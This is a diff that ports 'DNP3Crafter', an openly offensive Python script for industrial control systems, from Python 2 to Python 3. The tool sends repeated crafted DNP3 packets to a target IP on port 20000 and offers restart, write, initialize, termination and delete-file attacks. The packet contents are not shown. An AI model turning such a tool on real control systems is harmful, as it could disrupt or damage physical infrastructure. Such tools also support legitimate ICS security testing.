@@ -1,8 +1,8 @@
-#! /usr/bin/env python
+#! /usr/bin/env python3
 
-__author__  = "David Olano"
-__version__ = "1.0"
-__email__   = "david.olano@estudiante.uam.es"
+__author__  = "David Olano and James Brine"
+__version__ = "2.0"
+__email__   = "david.olano@estudiante.uam.es, james@jamesbrine.com.au"
 __status__  = "Production"
 
 '''DNP3Crafter'''
@@ -13,17 +13,17 @@ import time
 
 if __name__ == "__main__":
 
-    print "    ___     __   ___  _____    ___              __  _              "
-    print "   /   \ /\ \ \ / _ \|___ /   / __\_ __  __ _  / _|| |_  ___  _ __ "
-    print "  / /\ //  \/ // /_)/  |_ \  / /  | '__|/ _` || |_ | __|/ _ \| '__|"
-    print " / /_/// /\  // ___/  ___) |/ /___| |  | (_| ||  _|| |_|  __/| |   "
-    print "/___,' \_\ \/ \/     |____/ \____/|_|   \__,_||_|   \__|\___||_|\n "
+    print("    ___     __   ___  _____    ___              __  _              ")
+    print("   /   \\ /\\ \\ \\ / _ \\|___ /   / __\\_ __  __ _  / _|| |_  ___  _ __ ")
+    print("  / /\\ //  \\/ // /_)/  |_ \\  / /  | '__|/ _` || |_ | __|/ _ \\| '__|")
+    print(" / /_/// /\\  // ___/  ___) |/ /___| |  | (_| ||  _|| |_|  __/| |   ")
+    print("/___,' \\_\\ \\/ \\/     |____/ \\____/|_|   \\__,_||_|   \\__|\\___||_|\\n ")
         
     if len(sys.argv) != 2:
-        print '\nMissing arguments!'
-        print 'Try ./emisor.py dst-ip'
-        print 'Exiting...'
-        quit()
+        print('\nMissing arguments!')
+        print('Try ./emisor.py dst-ip')
+        print('Exiting...')
+        sys.exit()
 
     ipdst = sys.argv[1]    
     destport= 20000   #DNP3 standard port
@@ -32,21 +32,21 @@ if __name__ == "__main__":
 
     ''' Options selector '''
 
-    print 'Choose one action to perform:'
-    print '1: Health check'
-    print '2: Warm Restart attack'
-    print '3: Cold Restart attack'
-    print '4: Write attack'
-    print '5: Initialize data attack'
-    print '6: App function termination attack'
-    print '7: Delete file attack'
-    print ''
+    print('Choose one action to perform:')
+    print('1: Health check')
+    print('2: Warm Restart attack')
+    print('3: Cold Restart attack')
+    print('4: Write attack')
+    print('5: Initialize data attack')
+    print('6: App function termination attack')
+    print('7: Delete file attack')
+    print('')
 
-    attack_type = int(raw_input())
+    attack_type = int(input())
 
-    print 'Choose number of repetitions:'
+    print('Choose number of repetitions:')
 
-    attack_count = int(raw_input())  
+    attack_count = int(input())  
     
     ''' Create custom DNP3 packet '''
 
@@ -75,32 +75,24 @@ if __name__ == "__main__":
 
     i = 0
     packet=dnp3
-    print ''
+    print('')
 
     while (i < attack_count):
 
         try:
             mysocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	    mysocket.connect((ipdst,destport)) 
-	    mysocket.send(packet)
-	    mysocket.close()
-	    i=i+1
-	    time.sleep(1.02) #Time lapse between packets (in seconds)
-	    print 'Sent' , i , 'repetitions...'
+            mysocket.connect((ipdst,destport)) 
+            mysocket.send(packet)
+            mysocket.close()
+            i=i+1
+            time.sleep(1.02) #Time lapse between packets (in seconds)
+            print('Sent' , i , 'repetitions...')
 
-	except:
-	    print('Terrible Error!')
-	    import traceback
-	    traceback.print_exc()
-	    print("cannot bind port :(")
-            exit(1) 
+        except Exception as e:
+            print('Terrible Error!')
+            import traceback
+            traceback.print_exc()
+            print("cannot bind port :(")
+            sys.exit(1) 
 
-    print 'Finished.\n'
-    
-
-
-
-
-
-
-
+    print('Finished.\n')
